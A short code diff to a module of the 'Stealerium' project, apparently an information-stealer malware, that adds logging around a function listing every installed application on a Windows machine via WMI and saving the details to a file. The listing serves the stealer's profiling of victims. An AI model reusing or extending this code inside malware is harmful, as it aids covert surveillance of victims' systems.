@@ -12,6 +12,7 @@ namespace Stealerium.Target.System
         public static void WriteAppsList(string sSavePath)
         {
             var apps = new List<App>();
+            Logging.Log("Fetching Installed Apps >> Started!");
             try
             {
                 var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Product");
@@ -36,6 +37,7 @@ namespace Stealerium.Target.System
 
                     apps.Add(app);
                 }
+                
             }
             catch (Exception ex)
             {
@@ -51,6 +53,7 @@ namespace Stealerium.Target.System
                     $"\n\tINSTALL DATE: {app.InstallDate}" +
                     $"\n\tIDENTIFYING NUMBER: {app.IdentifyingNumber}" +
                     "\n\n");
+            Logging.Log("Fetching Installed Apps >> Ended!");
         }
 
         internal struct App
